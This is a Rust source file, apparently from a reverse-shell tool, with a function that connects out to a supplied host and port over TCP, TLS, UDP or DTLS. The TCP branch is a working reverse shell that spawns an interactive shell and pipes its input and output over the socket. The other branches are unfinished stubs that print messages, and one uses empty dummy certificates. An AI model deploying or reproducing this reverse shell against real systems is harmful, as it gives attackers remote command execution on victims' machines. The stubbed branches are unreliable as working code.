use std::io::{copy, Result};
use std::net::{TcpStream, UdpSocket, SocketAddr};
use std::process::{Command, Stdio};
use std::thread;
use crate::input::Protocol;

pub(crate) fn shell(host: String, port: String, shell: String, proto: Protocol) -> Result<()> {
    match proto {
        Protocol::Tcp => {
            let mut sock_write = TcpStream::connect(format!("{}:{}", host, port))?;
            let mut sock_write_err = sock_write.try_clone()?;
            let mut sock_read = sock_write.try_clone()?;
            let mut child = Command::new(shell)
                .arg("-i")
                .stdin(Stdio::piped())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped())
                .spawn()?;
            let mut stdin = child.stdin.take().expect("Failed to open stdin");
            let mut stdout = child.stdout.take().expect("Failed to open stdout");
            let mut stderr = child.stderr.take().expect("Failed to open stderr");
            thread::spawn(move || {
                copy(&mut stdout, &mut sock_write).expect("stdout closed");
            });
            thread::spawn(move || {
                copy(&mut stderr, &mut sock_write_err).expect("stderr closed");
            });
            thread::spawn(move || {
                copy(&mut sock_read, &mut stdin).expect("stdin closed");
            });
            child.wait()?;
        }
        Protocol::Tls => {
            use std::sync::Arc;
            use rustls::ClientConfig;
            use webpki_roots::TLS_SERVER_ROOTS;
            use crate::listener::tls::connect_tls;
            let mut root_store = rustls::RootCertStore::empty();
            root_store.extend(TLS_SERVER_ROOTS.iter().cloned());
            let config = ClientConfig::builder()
                .with_root_certificates(root_store)
                .with_no_client_auth();
            let config = Arc::new(config);
            let stream = TcpStream::connect(format!("{}:{}", host, port))?;
            let mut tls_stream = connect_tls(stream, config, &host)?;
            // TODO: Implement proper stdio <-> tls_stream piping for Windows
            eprintln!("TLS shell not fully implemented on Windows. You must implement a custom adapter for stdio <-> tls_stream");
        }
        Protocol::Udp => {
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            let addr: SocketAddr = format!("{}:{}", host, port).parse().unwrap();
            sock.connect(addr)?;
            // TODO: Implement proper stdio <-> udp piping for Windows
            eprintln!("UDP shell not fully implemented on Windows. You must implement a custom adapter for stdio <-> udp socket");
        }
        Protocol::Dtls => {
            use udp_dtls::{Identity, Certificate};
            use crate::listener::tls::connect_dtls;
            let sock = UdpSocket::bind("0.0.0.0:0")?;
            let addr: SocketAddr = format!("{}:{}", host, port).parse().unwrap();
            // For demo: use dummy identity/cert (replace with real certs in production)
            let identity = Identity::from_pkcs12(&[], "").unwrap_or_else(|_| panic!("Provide DTLS identity"));
            let peer_cert = Certificate::from_der(&[]).unwrap_or_else(|_| panic!("Provide DTLS peer cert"));
            let mut dtls_stream = connect_dtls(sock, addr, identity, peer_cert)?;
            // TODO: Implement proper stdio <-> dtls_stream piping for Windows
            eprintln!("DTLS shell not fully implemented on Windows. You must implement a custom adapter for stdio <-> dtls_stream");
        }
    }
    log::warn!("Shell exited");
    Ok(())
}
